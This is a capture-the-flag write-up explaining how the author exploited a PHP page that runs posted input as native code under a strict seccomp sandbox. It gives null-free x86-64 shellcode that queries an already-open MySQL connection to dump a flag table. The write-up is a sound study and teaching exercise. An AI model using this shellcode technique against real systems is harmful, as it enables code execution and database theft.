# shellql

The challenge was basicaly shellcoding in the context of PHP under a sandbox to make SQL queries. 

----

They provide us with a shared object `shellme.so` and a website. By appending ?source to the index.php, the source is shown.

This is the relevant source
```php
#!/usr/bin/php-cgi
<?php

if (isset($_GET['source']))
{
   show_source(__FILE__);
   exit();
}

$link = mysqli_connect('localhost', 'shellql', 'shellql', 'shellql');

if (isset($_POST['shell']))
{
   if (strlen($_POST['shell']) <= 1000)
   {
      echo $_POST['shell'];
      shellme($_POST['shell']);
   }
   exit();
}
```

The main part is the our input from post request is passed to a `shellme()` function, which is defined in the shared object `shellme.so`.

Opening `shellme.so` in our god IDA and following the shellme(), this is where it ends.

```cpp
__int64 __fastcall shell_this(void *src)
{
  size_t v1; // rbx
  void *v2; // rbp

  v1 = (signed int)strlen((const char *)src);
  v2 = mmap(0LL, v1, 7, 34, -1, 0LL);
  memcpy(v2, src, v1);
  alarm(0x1Eu);
  prctl(22, 1LL);
  return ((__int64 (*)(void))v2)();
}
```

So our input is basically copied to a mmap-ed region, then a seccomp sandbox is activated ( with `SECCOMP_MODE_STRICT` ) and then our input is executed. The `SECCOMP_MODE_STRICT` only allowed read(), write() and exit() syscalls.

Another thing is that it uses strlen(), which only reads upto null bytes. So we can't have null bytes in our shellcode or it'll be truncated.

Looking at the php code again, we see that it already makes a connection with the mysql server before executing our shellcode and the description says that the flag is in the table `flag`. So the FD for the connection will already be open and we can write SQL queries to it and read the response.

Since the server uses php-cgi, we first also have to write the php-cgi header, then send the sql query to the FD 4( of mysql server ), read the response and write it to stdout. 

By looking at the mysql [docs](https://dev.mysql.com/doc/internals/en/com-query.html), we figure out that the request consists something like this at the protocol level

```
| little endian, 4 bytes, length of query | 1 byte query type (0x3 for this query) | Our Query |
```

So we would send something like this to the mysql server

```
|0x13 0x00 0x00 0x00 | 0x3 | Select * from flag |
```

The plan is as follows then:
- Write the cgi header ( Content-type: text/html )
- Send the SQL query to fd 4 ( mysql server )
- Read response from fd 4 ( mysql server )
- Write the response received

I set up a quick shellcode development environment, which basically compiles my assembly, warns me if there are any null bytes and then prints the shellcode representation. Here it is:

```python
import os

asm = """

;SHELLCODE HERE

"""

with open("test.asm", "w") as f:
	f.write(asm)

os.system("nasm test.asm")

with open("test", "rb") as f:
	assembled = f.read()

hexCode = ""

for byte in assembled:
	hexCode += "\\x"+byte.encode('hex')

os.system("objdump -D -b binary test -m i386:x86-64 -M intel")

if '\x00' in assembled:
	print "NULL Bytes Found"

print "\n\nASSEMBLED to the following:"
print hexCode
```

The shellcode wasn't really a challenge, although I used some funky tricks to bypass NULL bytes at different places. I would write a 4 byte value to a register and then shift write so only the bytes I need are left

I used the JMP - CALL - POP technique to get the strings in registers, but since the shellcode was kinda long, sometimes the small relative JMPs would end up as big JMPs( which used null bytes ), so I used a bunch of PLT type trampolines to make sure all the JMPs are small. 

Here is my final shellcode:

```
jmp string1Trampolene

writeHeader:  ; writes the Header for php-cgi
pop r11
mov rax, 0x11111111
shr rax, 28
xor rdi, rdi
inc rdi
mov rsi, r11
mov rdx, 0x24242424
shr rdx, 24
syscall
jmp string2x2Trampolene ; Double trampolene of near jmps as far jmps have null bytes

sendSql: ; Sends the sql query
pop rsi
mov eax, DWORD [rsi]
shr eax, 24
mov DWORD [rsi], eax
mov rdi, 0x44444444  ; The file descriptor
shr rdi, 28
mov rax, 0x11111111  ; syscall number
shr rax, 28
mov rdx, 0x17171717 ; sets the length of query
shr rdx, 24
syscall
jmp readResp
nop

string1Trampolene: ; trampolene
jmp string1

writeFlag: ; Writes the flag from stack
mov rdx, rax ; same value read 
mov rax, 0x11111111
shr rax, 28
xor rdi, rdi
inc rdi
mov rsi, rsp
syscall
jmp exitCode

string2x2Trampolene: ; The trampolene
jmp string2Trampolene

readResp: ; reads the response from sql server
mov rax, 0x10101010
shr rax, 20
sub rsp, rax
xor rax, rax
mov rdi, 0x44444444  ; File descriptor 4
shr rdi, 28
mov rsi, rsp
mov rdx, 0x10101010 
shr rdx, 20
dec rdx ; sets rdx to 100
syscall
jmp writeFlag
nop

exitCode:
mov rax, 0x3c3c3c3c
shr rax, 24
xor rdi, rdi
syscall

string2Trampolene:
jmp string2

string1:
call writeHeader
db "Content-type: text/html",0x0a,0x0a,0x0a,0x0a,"r00t3d",0xa,0xa,0xa

string2:
call sendSql
db 0x13,0x13,0x13,0x13,0x3,"Select * from flag"

```

By Jazzy
